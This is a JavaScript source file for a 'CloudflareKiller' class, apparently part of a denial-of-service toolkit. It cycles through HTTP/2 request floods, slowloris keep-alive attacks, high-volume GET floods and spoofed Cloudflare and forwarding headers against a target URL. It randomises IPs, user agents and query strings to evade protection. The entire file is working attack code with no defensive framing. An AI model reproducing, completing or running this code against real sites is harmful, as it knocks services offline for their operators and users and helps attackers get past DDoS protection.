import http from 'http';
import https from 'https';
import http2 from 'http2';
import { URL } from 'url';
import { Tools } from '../../utils/tools.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';
import { logger } from '../../utils/logger.js';
import { globalIPRotator } from '../../utils/ip-rotator.js';

/**
 * CLOUDFLARE KILLER - OVERPOWER METHOD
 * Bypass Cloudflare protection dengan multiple techniques
 */
export class CloudflareKiller {
    constructor(targetUrl, duration, rpc = 64, userAgents = [], referers = [], proxies = null) {
        try {
            this.url = new URL(targetUrl);
        } catch (err) {
            throw new Error(`Invalid target URL: ${err.message}`);
        }
        this.duration = duration;
        this.rpc = rpc; // High RPC for maximum impact
        this.userAgents = userAgents;
        this.referers = referers;
        this.proxies = proxies;
        this.active = true;
        
        // Cloudflare bypass headers
        this.cfHeaders = [
            'CF-Connecting-IP',
            'CF-IPCountry',
            'CF-RAY',
            'CF-Visitor',
            'True-Client-IP',
            'X-Forwarded-For',
            'X-Real-IP',
            'X-Originating-IP',
            'X-Client-IP',
            'X-Host'
        ];
    }

    async start() {
        try {
            const endTime = Date.now() + (this.duration * 1000);

            while (Date.now() < endTime && this.active) {
                try {
                    // Mix of different attack techniques
                    const technique = Math.floor(Math.random() * 4);
                    
                    switch(technique) {
                        case 0:
                            await this.http2Attack();
                            break;
                        case 1:
                            await this.slowlorisAttack();
                            break;
                        case 2:
                            await this.bypassAttack();
                            break;
                        case 3:
                            await this.floodAttack();
                            break;
                    }
                } catch (err) {
                    logger.debug(`CF Killer iteration error: ${err.message}`);
                }
            }
        } catch (err) {
            logger.error(`Cloudflare Killer error: ${err.message}`);
            this.active = false;
        }
    }

    /**
     * HTTP/2 Attack - Bypass Cloudflare with HTTP/2
     */
    async http2Attack() {
        return new Promise((resolve) => {
            try {
                const client = http2.connect(this.url.origin, {
                    rejectUnauthorized: false
                });

                client.on('error', () => {
                    try { client.close(); } catch {}
                    resolve();
                });

                // Send multiple requests per connection
                for (let i = 0; i < this.rpc; i++) {
                    try {
                        const req = client.request({
                            ':method': 'GET',
                            ':path': this.url.pathname + '?' + this.generateQuery(),
                            ':scheme': this.url.protocol.replace(':', ''),
                            ':authority': this.url.host,
                            'user-agent': this.getRandomUA(),
                            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'accept-language': 'en-US,en;q=0.9',
                            'accept-encoding': 'gzip, deflate, br',
                            'cache-control': 'no-cache',
                            'pragma': 'no-cache',
                            'upgrade-insecure-requests': '1',
                            'sec-fetch-dest': 'document',
                            'sec-fetch-mode': 'navigate',
                            'sec-fetch-site': 'none',
                            'sec-fetch-user': '?1',
                            ...this.generateCFBypassHeaders()
                        });

                        req.on('response', () => {
                            REQUESTS_SENT.increment();
                            BYTES_SENT.add(1024);
                        });

                        req.on('error', () => {});
                        req.end();
                    } catch {}
                }

                setTimeout(() => {
                    try { client.close(); } catch {}
                    resolve();
                }, 1000);

            } catch (err) {
                resolve();
            }
        });
    }

    /**
     * Slowloris Attack - Keep connections alive
     */
    async slowlorisAttack() {
        return new Promise((resolve) => {
            try {
                const protocol = this.url.protocol === 'https:' ? https : http;
                
                const options = {
                    hostname: this.url.hostname,
                    port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                    path: this.url.pathname + '?' + this.generateQuery(),
                    method: 'GET',
                    headers: {
                        'Host': this.url.host,
                        'User-Agent': this.getRandomUA(),
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'Keep-Alive': 'timeout=600, max=1000',
                        ...this.generateCFBypassHeaders()
                    },
                    rejectUnauthorized: false,
                    timeout: 60000
                };

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.increment();
                    BYTES_SENT.add(res.headers['content-length'] || 1024);
                    
                    // Keep connection alive
                    res.on('data', () => {});
                    res.on('end', () => resolve());
                });

                req.on('error', () => resolve());
                req.on('timeout', () => {
                    req.destroy();
                    resolve();
                });

                // Send partial headers slowly
                req.write('X-a: b\r\n');
                
                setTimeout(() => {
                    try {
                        req.end();
                    } catch {}
                    resolve();
                }, 5000);

            } catch (err) {
                resolve();
            }
        });
    }

    /**
     * Bypass Attack - Spoof headers to bypass Cloudflare
     */
    async bypassAttack() {
        return new Promise((resolve) => {
            try {
                const protocol = this.url.protocol === 'https:' ? https : http;
                
                const options = {
                    hostname: this.url.hostname,
                    port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                    path: this.url.pathname + '?' + this.generateQuery(),
                    method: 'GET',
                    headers: {
                        'Host': this.url.host,
                        'User-Agent': this.getRandomUA(),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': this.getRandomReferer(),
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Cache-Control': 'max-age=0',
                        'X-Host': this.url.host,
                        ...this.generateCFBypassHeaders(),
                        ...this.generateRandomHeaders()
                    },
                    rejectUnauthorized: false
                };

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.increment();
                    BYTES_SENT.add(res.headers['content-length'] || 1024);
                    res.on('data', () => {});
                    res.on('end', () => resolve());
                });

                req.on('error', () => resolve());
                req.end();

            } catch (err) {
                resolve();
            }
        });
    }

    /**
     * Flood Attack - High volume requests
     */
    async floodAttack() {
        const promises = [];
        
        for (let i = 0; i < this.rpc; i++) {
            promises.push(this.sendRequest());
        }

        await Promise.allSettled(promises);
    }

    async sendRequest() {
        return new Promise((resolve) => {
            try {
                const protocol = this.url.protocol === 'https:' ? https : http;
                
                const options = {
                    hostname: this.url.hostname,
                    port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
                    path: this.url.pathname + '?' + this.generateQuery(),
                    method: 'GET',
                    headers: {
                        'Host': this.url.host,
                        'User-Agent': this.getRandomUA(),
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        ...this.generateCFBypassHeaders()
                    },
                    rejectUnauthorized: false,
                    timeout: 5000
                };

                const req = protocol.request(options, (res) => {
                    REQUESTS_SENT.increment();
                    BYTES_SENT.add(res.headers['content-length'] || 1024);
                    res.on('data', () => {});
                    res.on('end', () => resolve());
                });

                req.on('error', () => resolve());
                req.on('timeout', () => {
                    req.destroy();
                    resolve();
                });
                req.end();

            } catch (err) {
                resolve();
            }
        });
    }

    /**
     * Generate Cloudflare bypass headers with IP rotation
     */
    generateCFBypassHeaders() {
        const rotationHeaders = globalIPRotator.getRotationHeaders();
        return {
            ...rotationHeaders,
            'CF-IPCountry': globalIPRotator.getRandomCountry(),
            'CF-RAY': this.generateCFRay(),
            'CF-Visitor': '{"scheme":"https"}'
        };
    }

    /**
     * Generate random IP
     */
    generateRandomIP() {
        return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    /**
     * Generate random country code
     */
    getRandomCountry() {
        const countries = ['US', 'GB', 'DE', 'FR', 'JP', 'CA', 'AU', 'NL', 'SE', 'NO', 'DK', 'FI'];
        return countries[Math.floor(Math.random() * countries.length)];
    }

    /**
     * Generate Cloudflare RAY ID
     */
    generateCFRay() {
        const chars = '0123456789abcdef';
        let ray = '';
        for (let i = 0; i < 16; i++) {
            ray += chars[Math.floor(Math.random() * chars.length)];
        }
        return ray + '-' + this.getRandomCountry();
    }

    /**
     * Generate random query string
     */
    generateQuery() {
        const params = [];
        const count = Math.floor(Math.random() * 5) + 1;
        
        for (let i = 0; i < count; i++) {
            const key = Math.random().toString(36).substring(7);
            const value = Math.random().toString(36).substring(7);
            params.push(`${key}=${value}`);
        }
        
        return params.join('&');
    }

    /**
     * Generate random headers
     */
    generateRandomHeaders() {
        const headers = {};
        const headerNames = ['X-Custom', 'X-Requested-With', 'X-CSRF-Token', 'X-Request-ID'];
        
        for (const name of headerNames) {
            headers[name] = Math.random().toString(36).substring(7);
        }
        
        return headers;
    }

    /**
     * Get random User-Agent
     */
    getRandomUA() {
        if (this.userAgents.length > 0) {
            return Tools.randomChoice(this.userAgents);
        }
        
        const uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15'
        ];
        
        return uas[Math.floor(Math.random() * uas.length)];
    }

    /**
     * Get random Referer
     */
    getRandomReferer() {
        if (this.referers.length > 0) {
            return Tools.randomChoice(this.referers);
        }
        
        const referers = [
            'https://www.google.com/',
            'https://www.bing.com/',
            'https://www.yahoo.com/',
            'https://www.facebook.com/',
            'https://www.twitter.com/'
        ];
        
        return referers[Math.floor(Math.random() * referers.length)];
    }

    stop() {
        this.active = false;
    }
}
